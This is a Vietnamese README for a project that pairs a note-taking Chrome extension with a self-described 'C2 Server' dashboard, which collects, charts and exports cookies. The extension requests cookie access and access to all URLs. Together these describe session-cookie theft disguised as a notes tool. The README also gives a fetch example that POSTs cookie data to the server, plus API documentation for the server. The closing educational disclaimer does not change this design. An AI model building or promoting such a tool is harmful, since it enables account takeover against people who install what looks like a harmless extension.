# Cookie Extension & Notes Plus

Dự án bao gồm hai thành phần chính: **Notes Extension** - Chrome Extension quản lý ghi chú chuyên nghiệp và **C2 Server** - Server quản lý cookies với giao diện dashboard hiện đại.

## 📋 Mục lục

- [Tính năng](#-tính-năng)
- [Cài đặt](#-cài-đặt)
- [Hướng dẫn sử dụng](#-hướng-dẫn-sử-dụng)
- [Cấu trúc dự án](#-cấu-trúc-dự-án)
- [Công nghệ sử dụng](#-công-nghệ-sử-dụng)
- [API Documentation](#-api-documentation)
- [Contributing](#-contributing)
- [License](#-license)

## ✨ Tính năng

### Notes Plus - Chrome Extension

#### 🎨 Giao diện

- **Dark/Light Mode**: Chuyển đổi theme dễ dàng
- **Modern UI**: Giao diện hiện đại với animations mượt mà
- **Responsive Design**: Tối ưu cho mọi kích thước màn hình
- **Color Coding**: Hệ thống màu sắc cho từng ghi chú

#### 📝 Quản lý Ghi chú

- **Tạo ghi chú nhanh**: Thêm ghi chú với textarea
- **Chỉnh sửa inline**: Click vào ghi chú để chỉnh sửa trực tiếp
- **Ghim ghi chú**: Đánh dấu ghi chú quan trọng
- **Xóa ghi chú**: Xóa từng ghi chú hoặc nhiều ghi chú
- **Nhãn phân loại**: Phân loại ghi chú (Công việc, Cá nhân, Quan trọng)
- **Lưu trữ local**: Dữ liệu được lưu trong Chrome Storage

#### 🔍 Tìm kiếm & Lọc

- **Tìm kiếm real-time**: Tìm kiếm theo nội dung hoặc nhãn
- **Lọc theo nhãn**: Lọc ghi chú theo category
- **Lọc ghi chú đã ghim**: Xem nhanh các ghi chú quan trọng
- **Sắp xếp**: Sắp xếp theo mới nhất, cũ nhất, đã ghim, hoặc theo nhãn

#### ⚡ Tính năng nâng cao

- **Context Menu**: Lưu text đã chọn vào ghi chú từ context menu
- **Notifications**: Thông báo khi lưu ghi chú thành công
- **Auto-save**: Tự động lưu khi tạo/chỉnh sửa
- **Keyboard Shortcuts**:
  - `Enter` để lưu ghi chú mới
  - `Ctrl+Enter` để lưu khi chỉnh sửa
  - `Escape` để hủy chỉnh sửa

### C2 Server - Cookie Management

#### 🎯 Dashboard Features

- **Real-time Monitoring**: Theo dõi cookies nhận được theo thời gian thực
- **Professional UI**: Giao diện C2 server style với dark theme
- **Data Table**: Bảng dữ liệu với đầy đủ thông tin
- **Search & Filter**: Tìm kiếm và lọc cookies
- **Hide Duplicates**: Ẩn các cookie trùng lặp
- **Export Data**: Xuất dữ liệu ra file JSON

#### 📊 Analytics Dashboard

- **Timeline Chart**: Biểu đồ thời gian nhận cookies
- **Hourly Distribution**: Phân bố cookies theo giờ
- **Daily Statistics**: Thống kê theo ngày
- **Size Distribution**: Phân bố kích thước dữ liệu
- **Activity Log**: Nhật ký hoạt động gần đây
- **Real-time Stats**: Thống kê cập nhật tự động

#### 🔧 Server Features

- **RESTful API**: API endpoints đầy đủ
- **CORS Support**: Hỗ trợ cross-origin requests
- **Auto-refresh**: Tự động làm mới dữ liệu
- **Cookie Management**: Quản lý, xóa cookies
- **Timestamp Tracking**: Theo dõi thời gian nhận cookie

## 🚀 Cài đặt

### Yêu cầu hệ thống

- Node.js >= 14.x
- npm hoặc yarn
- Google Chrome hoặc Chromium-based browser

### Cài đặt Server

```bash
# Di chuyển vào thư mục server
cd server_cookie

# Cài đặt dependencies
npm install

# Khởi chạy server
npm start

# Hoặc sử dụng nodemon để auto-reload
npm run start
```

Server sẽ chạy tại: `http://localhost:3000`

### Cài đặt Chrome Extension

1. Mở Google Chrome và truy cập `chrome://extensions/`
2. Bật **Developer mode** (góc trên bên phải)
3. Click **Load unpacked**
4. Chọn thư mục `note_plus`
5. Extension sẽ được cài đặt và hiển thị trong toolbar

## 📖 Hướng dẫn sử dụng

### Notes Plus Extension

#### Tạo ghi chú mới

1. Click vào icon extension trên toolbar
2. Nhập nội dung ghi chú vào textarea
3. Chọn màu và nhãn (tùy chọn)
4. Click **Thêm Ghi Chú** hoặc nhấn `Enter`

#### Chỉnh sửa ghi chú

1. Click vào nội dung ghi chú muốn chỉnh sửa
2. Chỉnh sửa trong textarea
3. Click **Lưu** hoặc nhấn `Ctrl+Enter`
4. Click **Hủy** hoặc nhấn `Escape` để hủy

#### Sử dụng Context Menu

1. Chọn text trên trang web
2. Right-click và chọn **Lưu vào Notes Plus**
3. Ghi chú sẽ được tạo tự động

#### Tìm kiếm và Lọc

- Sử dụng thanh tìm kiếm để tìm ghi chú
- Click vào các nút lọc để lọc theo nhãn
- Sử dụng dropdown để sắp xếp

### C2 Server

#### Xem Dashboard

1. Mở trình duyệt và truy cập `http://localhost:3000`
2. Xem danh sách cookies trong bảng
3. Sử dụng thanh tìm kiếm để tìm cookie
4. Bật **Hide Duplicates** để ẩn cookie trùng

#### Xem Analytics

1. Click vào **Analytics** trong sidebar
2. Xem các biểu đồ và thống kê
3. Chọn time range cho timeline chart
4. Bật **Hide Duplicates** để phân tích dữ liệu unique

#### Gửi Cookie đến Server

```javascript
// Sử dụng fetch API
fetch("http://localhost:3000/", {
  method: "POST",
  headers: {
    "Content-Type": "text/plain",
  },
  body: "cookie_data_here",
})
  .then((response) => response.text())
  .then((data) => console.log(data));
```

## 📁 Cấu trúc dự án

```
cookie-extension/
├── note-extension/                 # Chrome Extension
│   ├── background.js         # Service worker
│   ├── popup.html            # Giao diện popup
│   ├── popup.js              # Logic popup
│   ├── styles.css            # Styles (unused, styles inline)
│   ├── manifest.json         # Extension manifest
│   └── icons/                # Extension icons
│       ├── icon16.ico
│       ├── icon48.ico
│       └── icon128.ico
│
└── c2-server/            # Node.js Server
    ├── server.js             # Server main file
    ├── package.json          # Dependencies
    ├── public/               # Static files
    │   ├── index.html        # Dashboard page
    │   ├── analytics.html    # Analytics page
    │   └── styles.css        # Shared styles
    └── node_modules/         # Dependencies
```

## 🛠 Công nghệ sử dụng

### Notes Plus

- **HTML5/CSS3**: Giao diện và styling
- **Vanilla JavaScript**: Logic xử lý
- **Chrome Extension API**: Storage, Context Menus, Notifications
- **Font Awesome**: Icons
- **Chrome Storage API**: Lưu trữ dữ liệu local

### C2 Server

- **Node.js**: Runtime environment
- **Express.js**: Web framework
- **Chart.js**: Biểu đồ và visualization
- **Font Awesome**: Icons
- **HTML5/CSS3**: Giao diện dashboard

## 📡 API Documentation

### POST `/`

Nhận cookie data từ client

**Request:**

```
Content-Type: text/plain
Body: cookie_data_string
```

**Response:**

```
Cookie đã được nhận thành công!
```

### GET `/get-cookie-names`

Lấy danh sách cookie names (array)

**Response:**

```json
["cookie1", "cookie2", "cookie3"]
```

### GET `/get-cookies`

Lấy danh sách cookies đầy đủ với metadata

**Response:**

```json
[
  {
    "id": 1,
    "data": "cookie_data",
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
]
```

### POST `/clear-cookies`

Xóa tất cả cookies

**Response:**

```json
{
  "success": true,
  "message": "All cookies cleared"
}
```

### DELETE `/cookie/:id`

Xóa một cookie cụ thể

**Response:**

```json
{
  "success": true,
  "message": "Cookie deleted"
}
```

## 🎨 Screenshots

### Notes Plus Extension

- Giao diện popup với dark mode
- Danh sách ghi chú với màu sắc
- Tìm kiếm và lọc

### C2 Server Dashboard

- Dashboard chính với bảng cookies
- Analytics page với biểu đồ
- Real-time statistics

## 🔒 Permissions

### Notes Plus Extension

- `storage`: Lưu trữ ghi chú
- `contextMenus`: Context menu integration
- `cookies`: Cookie access (nếu cần)
- `activeTab`: Access tab content
- `notifications`: Hiển thị thông báo
- `host_permissions`: Access all URLs

## 🐛 Troubleshooting

### Server không khởi động

- Kiểm tra port 3000 có đang được sử dụng không
- Đảm bảo đã cài đặt dependencies: `npm install`
- Kiểm tra Node.js version: `node --version`

### Extension không hoạt động

- Kiểm tra Developer mode đã bật chưa
- Reload extension trong `chrome://extensions/`
- Kiểm tra console để xem lỗi (F12)

### Cookies không hiển thị

- Kiểm tra server đang chạy
- Kiểm tra CORS settings
- Xem Network tab trong DevTools

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the ISC License.

## 👤 Author

Developed with ❤️ for efficient note-taking and cookie management.

## 🙏 Acknowledgments

- [Chart.js](https://www.chartjs.org/) for beautiful charts
- [Font Awesome](https://fontawesome.com/) for icons
- [Express.js](https://expressjs.com/) for the web framework

---

**Note**: Dự án này được phát triển cho mục đích giáo dục và quản lý cá nhân. Vui lòng sử dụng có trách nhiệm và tuân thủ các quy định về privacy và security.
